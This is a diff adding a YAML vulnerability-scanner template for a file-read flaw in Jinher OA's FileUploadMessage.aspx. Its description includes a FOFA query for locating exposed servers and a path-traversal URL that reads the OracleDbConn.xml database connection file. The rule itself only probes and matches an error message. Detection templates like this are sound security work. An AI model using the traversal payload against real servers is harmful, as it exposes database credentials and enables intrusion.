@@ -1,0 +1,18 @@
+id: jinher-oa-fileuploadmessage-fileread
+
+info:
+  name: jinher OA FileUploadMessage.aspx Fileread
+  author: qwtd
+  severity: high
+  description: |
+    fofa: app="金和网络-金和OA"
+    有概率可以读取到/C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml数据库文件
+  created: 2023/10/24
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=/
+    expression: response.status == 200 && response.body.bcontains(b'文件不存在,文件名')
+expression: r0()
